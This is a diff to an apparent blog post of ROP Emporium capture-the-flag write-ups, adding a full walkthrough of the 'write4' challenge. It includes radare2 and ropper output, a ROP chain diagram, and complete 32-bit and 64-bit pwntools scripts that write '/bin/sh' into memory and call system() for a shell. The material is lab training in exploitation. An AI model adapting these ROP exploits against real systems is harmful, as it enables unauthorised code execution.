@@ -26,6 +26,10 @@ categories: writeups rop-emporium
     </ul>
     </li>
     <li><a href="#write4" id="markdown-toc-h1-header">write4</a>
+    <ul>
+        <li><a href="#32-bit-3" id="markdown-toc-h3-header">32-bit</a></li>
+        <li><a href="#64-bit-3" id="markdown-toc-h3-header">64-bit</a></li>
+    </ul>
     </li>
     <li><a href="#badchars" id="markdown-toc-h1-header">badchars</a>
     </li>
@@ -693,6 +697,7 @@ ROPE{a_placeholder_32byte_flag!}
 For this challenge, the description tells us we have to call `callme_one(1, 2, 3)`, `callme_two(1, 2, 3)` and `callme_three(1, 2, 3)`, in that order, to get the flag.
 
 ### 32-bit
+<a href="{{ page.url }}#title">Back to top ↑</a>
 
 Running checksec.
 ```shell
@@ -850,6 +855,7 @@ ROPE{a_placeholder_32byte_flag!}
 ```
 
 ### 64-bit
+<a href="{{ page.url }}#title">Back to top ↑</a>
 
 The 64-bit version is the same, except now instead of popping three values off the stack everytime, we just have to pop those three values into the three registers RDI (first argument), RSI (second argument), and RDX (third argument), in that order. The functions will use the values in those registers as their arguments. I will skip everything except the exploit script since I've already explained how to find the addresses required for the functions and the gadget.
 
@@ -906,7 +912,309 @@ ROPE{a_placeholder_32byte_flag!}
 # write4
 <a href="{{ page.url }}#title">Back to top ↑</a>
 
-To be added.
+The challenge description tells us that this time, the string "/bin/cat flag.txt" doesn't actually exist anywhere in the binary. It hints at the fact that we have to write the string ourselves somewhere into the binary first, in order to be able to pass it to `system()`. It also tells us we need a gadget of the form `mov [reg1], reg2` to move a value stored in `reg2` to a memory address stored in `reg1`.
+
+I took a little bit of a different route. Instead of writing the string "/bin/cat flag.txt", which would be 17 bytes, I instead chose to write the string "/bin/sh ", which is 8 bytes. This gets me a shell. The trailing space at the end just after "/sh " is important since it aligns the string to 4 and 8 bytes (for the 32-bit and 64-bit versions respectively). If we don't align it correctly, the exploit might not work as intended.
+
+Enough with the description, lets get down to business.
+
+### 32-bit
+<a href="{{ page.url }}#title">Back to top ↑</a>
+
+Running checksec.
+```shell
+~/Documents/ropemporium/write4/32write4# checksec write432
+[*] '/root/Documents/ropemporium/write4/32write4/write432'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+As the challenge tells us, we won't find the string "/bin/cat flag.txt" in the binary, but we may as well check.
+```shell
+~/Documents/ropemporium/write4/32write4# rabin2 -z write432
+[Strings]
+Num Paddr      Vaddr      Len Size Section  Type  String
+000 0x00000700 0x08048700  22  23 (.rodata) ascii write4 by ROP Emporium
+001 0x00000717 0x08048717   7   8 (.rodata) ascii 32bits\n
+002 0x0000071f 0x0804871f   8   9 (.rodata) ascii \nExiting
+003 0x00000728 0x08048728  40  41 (.rodata) ascii Go ahead and give me the string already!
+004 0x00000754 0x08048754   7   8 (.rodata) ascii /bin/ls
+```
+
+Okay, let's analyze the binary in radare2.
+```shell
+~/Documents/ropemporium/write4/32write4# r2 write432
+[0x08048480]> aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Enable constraint types analysis for variables
+[0x08048480]> afl
+0x080483c0    3 35           sym._init
+0x08048400    1 6            sym.imp.printf
+0x08048410    1 6            sym.imp.fgets
+0x08048420    1 6            sym.imp.puts
+0x08048430    1 6            sym.imp.system
+0x08048440    1 6            sym.imp.__libc_start_main
+0x08048450    1 6            sym.imp.setvbuf
+0x08048460    1 6            sym.imp.memset
+0x08048470    1 6            sub.__gmon_start_8048470
+0x08048480    1 33           entry0
+0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
+0x080484c0    4 43           sym.deregister_tm_clones
+0x080484f0    4 53           sym.register_tm_clones
+0x08048530    3 30           sym.__do_global_dtors_aux
+0x08048550    4 43   -> 40   entry.init0
+0x0804857b    1 123          sym.main
+0x080485f6    1 86           sym.pwnme
+0x0804864c    1 25           sym.usefulFunction
+0x08048680    4 93           sym.__libc_csu_init
+0x080486e0    1 2            sym.__libc_csu_fini
+0x080486e4    1 20           sym._fini
+[0x08048480]> s sym.usefulFunction
+[0x0804864c]> pdf
+/ (fcn) sym.usefulFunction 25
+|   sym.usefulFunction ();
+|           0x0804864c      55             push ebp
+|           0x0804864d      89e5           mov ebp, esp
+|           0x0804864f      83ec08         sub esp, 8
+|           0x08048652      83ec0c         sub esp, 0xc
+|           0x08048655      6854870408     push str.bin_ls             ; 0x8048754 ; "/bin/ls"
+|           0x0804865a      e8d1fdffff     call sym.imp.system         ; int system(const char *string)
+|           0x0804865f      83c410         add esp, 0x10
+|           0x08048662      90             nop
+|           0x08048663      c9             leave
+\           0x08048664      c3             ret
+[0x0804864c]> 
+
+```
+
+I just assume `pwnme()` has the usual buffer overflow. `usefulFunction` doesn't seem so useful at all, but it does hint at the fact that we need to call `system()` later. Cool.
+
+Now we need to find a spot in memory that we can write to.
+```shell
+[0x08048480]> iS
+[Sections]
+Nm Paddr       Size Vaddr      Memsz Perms Name
+00 0x00000000     0 0x00000000     0 ---- 
+...
+19 0x00000f08     4 0x08049f08     4 -rw- .init_array
+20 0x00000f0c     4 0x08049f0c     4 -rw- .fini_array
+21 0x00000f10     4 0x08049f10     4 -rw- .jcr
+22 0x00000f14   232 0x08049f14   232 -rw- .dynamic
+23 0x00000ffc     4 0x08049ffc     4 -rw- .got
+24 0x00001000    40 0x0804a000    40 -rw- .got.plt
+25 0x00001028     8 0x0804a028     8 -rw- .data
+26 0x00001030     0 0x0804a040    44 -rw- .bss
+...
+
+[0x08048480]> 
+```
+
+Seeing as our string "/bin/sh " is 8 bytes in length, I chose the .data section to write the string to as it has the perfect size.
+
+Now, let's use ropper to find some gadgets that we might be able to use.
+```shell
+~/Documents/ropemporium/write4/32write4# ropper -f write432
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+
+
+
+Gadgets
+=======
+
+
+...
+0x08048670: mov dword ptr [edi], ebp; ret; 
+...
+0x080486da: pop edi; pop ebp; ret; 
+...
+```
+
+It took me a little bit to find two gadgets that matched the registers, but I ended up finding these `mov` and `pop` gadgets that would work perfectly.
+
+Now, let's try to build the ROP chain. I like to do this on paper first (which I've already done). I will show the ROP chain then explain it. The stack goes from top to bottom, with lower memory addresses on the top and higher memory addresses on the bottom.
+
+```shell
+|  # Write the "/bin" string to the .data section
+|
+|  {AAAAAAAAA_buffer_overflow_str}
+|  {pop_edi_pop_ebp_ret_gadget_addr}
+|  {addr_of_.data_section_in_memory}
+|  {the_/bin_string}
+|  {mov_[edi]_ebp_ret_gadget_addr}
+|  
+|  # Now repeat the same thing for the "/sh " string
+|
+|  {pop_edi_pop_ebp_ret_gadget_addr}
+|  {addr_of_.data_section_in_memory_plus_0x4}
+|  {the_/sh_string}
+|  {mov_[edi]_ebp_ret_gadget_addr}
+|
+|  # Now, call system()
+|
+|  {addr_of_system}
+|  {return_addr_of_system}
+|  {addr_of_.data_section_in_memory}
+```
+
+Explanation for the above ROP chain:
+
+1. First, we overflow the buffer and change the return address to the `pop edi; pop ebp; ret;` gadget
+2. The next value on the stack must be the address to the .data section. This is popped into EDI.
+3. The next value on the stack will be the string "/bin". This is popped into EBP.
+4. The pop edi gadget returns into the `mov [edi], ebp; ret;` gadget, which moves the string stored in EBP to the memory location stored in EDI.
+5. We repeat the exact same thing for the remainder of the string "/sh ", except this time we have to ensure to add 0x4 to the address of the .data section so that we don't overwrite the already written string "/bin".
+6. The final `ret;` in the mov gadget will then return into `system()`, and we set up the stack so that the argument to system is the address to the .data section where our "/bin/sh " string is stored.
+
+Using the above information, we write the exploit script.
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+context.log_level = 'critical'
+elf = ELF("./write432")
+
+# Gadgets
+pop_two_addr = p32(0x080486da) # pop edi; pop ebp; ret;
+mov_addr = p32(0x08048670) # mov [edi], ebp;
+
+data_addr = 0x0804a028 # memory address of the .data section
+system_addr = p32(0x08048430) # address to system()
+
+'''
+Note that we have to write the string "/bin/sh " 4 bytes at a time since this 
+is a 32-bit binary. In the 64-bit version, we can write the whole string in one
+go as an 8 byte write.
+'''
+
+payload = "A"*44 # Overflow the buffer (offset found using gdb gef, refer to previous challenges)
+payload += pop_two_addr # Jump to the 'pop edi; pop ebp; ret;' gadget
+payload += p32(data_addr) # Pop this into edi
+payload += "/bin" # Pop this into ebp
+
+# mov [edi], ebp will move "/bin" into the memory location stored in edi
+payload += mov_addr
+
+'''
+Now repeat the same thing with the remaining of the string, taking note of
+the fact that you have to remember to do two things:
+
+1. Add four bytes to the address of the .data section, otherwise you will
+   overwrite the "/bin" string with "/sh "
+
+2. Ensure there is a trailing space in "/sh ". This is important as otherwise
+   it will probably get replaced by a null byte (in order to make it 4 bytes in
+   size). The null byte might cause the exploit to not work as intended.
+'''
+
+payload += pop_two_addr
+payload += p32(data_addr + 0x4)
+payload += "/sh "
+payload += mov_addr
+
+'''
+Right now, the .data section contains the string "/bin/sh ". We can now call
+system just like we did for the 'split32' challenge by setting up the stack
+such that the mov gadget from above returns to system()
+'''
+
+payload += system_addr # Return to the system() function from the mov gadget
+payload += p32(0xdeadbeef) # Return address for system doesn't matter
+payload += p32(data_addr) # Location in memory of "/bin/sh "
+
+sh = elf.process()
+
+sh.recvuntil("> ")
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+Running the exploit.
+```shell
+~/Documents/ropemporium/write4/32write4# chmod +x exploit.py && ./exploit.py
+$ ls
+core  exploit.py  flag.txt  payload  write432
+$ cat flag.txt
+ROPE{a_placeholder_32byte_flag!}
+$  
+```
+
+### 64-bit
+<a href="{{ page.url }}#title">Back to top ↑</a>
+
+The way the challenges have been going, we know that we have to do the exact same thing that we did in the 32-bit version with some slight changes. First, we have to change the ROP chain to ensure it confines with what a 64-bit ROP chain should look like. Secondly, we have to change the way we call `system()` since we have to pop the argument (the address to the .data section) into RDI first.
+
+We can also write the whole "/bin/sh " string in one go now, since on a 64-bit system, the registers can store 8 bytes at a time.
+
+I've commented my code to explain the exploit as much as I could. If you are still confused, I suggest looking at the explanation for the 32-bit version above. It is the same thing with some slight changes.
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+context.log_level = 'critical'
+elf = ELF("./write4")
+
+# Gadgets
+mov_addr = p64(0x0000000000400820) # move [r14], r15
+pop_two_addr = p64(0x0000000000400890) # pop r14; pop r15; ret;
+pop_rdi_addr = p64(0x0000000000400893) # pop rdi; ret;
+
+data_addr = 0x00601050 # .data section address
+system_addr = p64(0x004005e0) # system() address
+
+'''
+When putting the string "/bin/sh " into the register, the trailing
+space is important. Otherwise a NULL byte gets placed there instead,
+which can cause the exploit to not work as intended
+'''
+
+payload = "A"*40 # Overflow the buffer (offset found using gdb gef, refer to previous challenges)
+payload += pop_two_addr # jump to the 'pop r14; pop r15; ret;' gadget
+payload += p64(data_addr) # pop the address of the data section into r14
+payload += "/bin/sh " # pop the string "/bin/sh " into r15
+payload += mov_addr # jump to the 'mov [r14], r15' gadget
+
+'''
+At this stage, the data section will contain the string "/bin/sh " since
+the mov instruction above just moved the string from r15 into the memory
+address stored inside r14
+'''
+
+payload += pop_rdi_addr # return to the 'pop rdi; ret;' gadget from the mov instruction
+payload += p64(data_addr) # pop the address of the string "/bin/sh " into rdi
+payload += system_addr # return from the gadget into system
+
+# -- System's return address doesn't matter --
+
+sh = elf.process()
+
+sh.recvuntil("> ")
+sh.sendline(payload)
+
+sh.interactive()
+
+```
+
+Running the exploit.
+```shell
+~/Documents/ropemporium/write4/64write4# chmod +x exploit.py && ./exploit.py
+$ ls
+exploit.py  flag.txt  write4
+$ cat flag.txt
+ROPE{a_placeholder_32byte_flag!}
+$  
+```
 
 # badchars
 <a href="{{ page.url }}#title">Back to top ↑</a>
